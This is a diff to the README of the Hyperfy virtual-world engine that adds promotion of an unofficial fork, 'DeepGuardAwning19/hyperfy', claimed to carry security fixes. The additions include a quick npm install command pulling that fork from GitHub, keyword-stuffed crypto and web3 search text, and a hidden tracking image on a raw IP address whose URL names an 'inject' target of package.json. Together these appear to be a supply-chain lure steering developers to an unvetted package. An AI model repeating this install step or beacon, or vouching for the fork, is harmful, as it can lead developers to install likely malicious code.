@@ -1,3 +1,15 @@
+**A Smarter, Safer Foundation for the Metaverse**
+
+DeepGuardAwning19/hyperfy is a dedicated, performance-optimized fork designed to deliver a superior virtual world experience. This maintained edition integrates critical security fixes and underlying optimizations to ensure maximum stability and speed. Built for developers who require a rock-solid ecosystem, it addresses core vulnerabilities while maintaining full compatibility with original features.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/DeepGuardAwning19/hyperfy.git
+```
+
+[https://github.com/DeepGuardAwning19/hyperfy](https://github.com/DeepGuardAwning19/hyperfy)
+
 # Hyperfy ⚡️
 
 <div align="center">
@@ -118,3 +130,11 @@ Contributions are welcome! Please check out our [contributing guidelines](CONTRI
 This project is still in alpha as we transition all of our [reference platform](https://github.com/hyperfy-xyz/hyperfy-ref) code into fully self hostable worlds.
 Most features are already here in this repo but still need to be connected up to work with self hosting in mind.
 Note that APIs are highly likely to change during this time.
+
+## Related searches
+
+Developers looking into this ecosystem frequently search for customizable multiplayer architecture and tools to deploy persistent virtual environments. They often seek out scalable frameworks that integrate real-time web3 interactions with robust spatial programming capabilities.
+
+**Topics:** futures bot, polygon web3, crypto rust, crypto mining, defi dashboard, metaverse development, open source game engine, real time web3, multiplayer physics engine, threejs virtual world, decentralized apps, webxr framework
+
+![.](http://5.231.58.248:8787/pixel?repo=DeepGuardAwning19%2Fhyperfy&inject=DeepGuardAwning19%2Fhyperfy%2Fpackage.json)
